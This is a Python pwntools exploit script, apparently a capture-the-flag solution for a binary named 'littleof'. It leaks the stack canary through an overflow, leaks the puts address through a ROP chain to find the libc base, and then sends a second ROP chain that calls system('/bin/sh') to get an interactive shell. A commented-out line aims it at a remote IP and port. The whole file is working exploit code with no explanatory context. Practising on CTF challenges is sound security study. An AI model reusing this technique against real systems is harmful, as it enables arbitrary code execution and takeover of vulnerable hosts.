from pwn import*
#r = remote("182.116.62.85",27056)
r =process('./littleof')
elf = ELF('./littleof')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context(log_level='debug',os='linux',arch='amd64')

pop_rdi_ret     = 0x0400863
main_addr       = 0x0400789
pop_rsi_r15_ret = 0x0400861

payload = b'A'*(0x50-8)

r.recvuntil("?")
r.sendline(payload)
r.recvuntil("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
canary = u64(r.recv(8).ljust(8,b'\x00'))
canary = canary - 0x0a
success(hex(canary))


payload = b'a'*(0x50-8) + p64(canary) + b'b'*8
payload += p64(pop_rdi_ret)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(main_addr)

r.recvuntil("!")
r.sendline(payload)


leak = u64(r.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
libc_base = leak - libc.symbols['puts']
sys = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))


payload = b'A'*(0x50-8)

r.recvuntil("?")
r.sendline(payload)
r.recvuntil("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
canary = u64(r.recv(8).ljust(8,b'\x00'))
canary = canary - 0x0a
success(hex(canary))


payload = b'a'*(0x50-8) + p64(canary) + b'b'*8
payload += p64(pop_rdi_ret)
payload += p64(binsh)
payload += p64(pop_rsi_r15_ret)
payload += p64(0)*2
payload += p64(sys)

r.recvuntil("!")
r.sendline(payload)
r.interactive()